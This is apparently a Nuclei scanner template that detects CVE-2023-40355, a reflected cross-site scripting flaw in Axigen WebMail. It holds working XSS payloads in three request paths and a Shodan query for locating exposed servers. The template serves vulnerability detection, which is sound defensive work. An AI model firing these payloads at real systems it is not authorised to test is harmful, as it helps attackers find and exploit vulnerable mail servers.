http:
- matchers:
  - condition: or
    part: body
    type: word
    words:
    - \\'-alert(document.domain),//
    - ''',alert(document.domain),'''
  - condition: and
    dsl:
    - contains(header, "text/html")
    - contains(response, "Axigen")
    - status_code == 200
    type: dsl
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/index.hsp?passwordExpired=yes&username=\''-alert(document.domain),//'
  - '{{BaseURL}}/index.hsp?passwordExpired=yes&domainName=\''-alert(document.domain),//'
  - '{{BaseURL}}/index.hsp?m='',alert(document.domain),'''
  stop-at-first-match: true
id: CVE-2023-40355
info:
  author: amir-h-fallahi
  classification:
    cve-id: CVE-2023-40355
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N
    cvss-score: 6.5
    cwe-id: CWE-79
    epss-percentile: 0.22931
    epss-score: 0.0006
  description: 'Cross Site Scripting (XSS) vulnerability in Axigen versions 10.3.3.0
    before 10.3.3.59, 10.4.0 before 10.4.19, and 10.5.0 before 10.5.5, allows authenticated
    attackers to execute arbitrary code and obtain sensitive information via the logic
    for switching between the Standard and Ajax versions.

    '
  metadata:
    max-request: 3
    shodan-query: http.favicon.hash:-1247684400
    verified: true
  name: Axigen WebMail - Cross-Site Scripting
  reference:
  - https://www.axigen.com/knowledgebase/Axigen-WebMail-XSS-Vulnerability-CVE-2023-40355-_396.html
  - https://nvd.nist.gov/vuln/detail/CVE-2023-40355
  severity: medium
  tags: cve,cve2023,xss,axigen,webmail
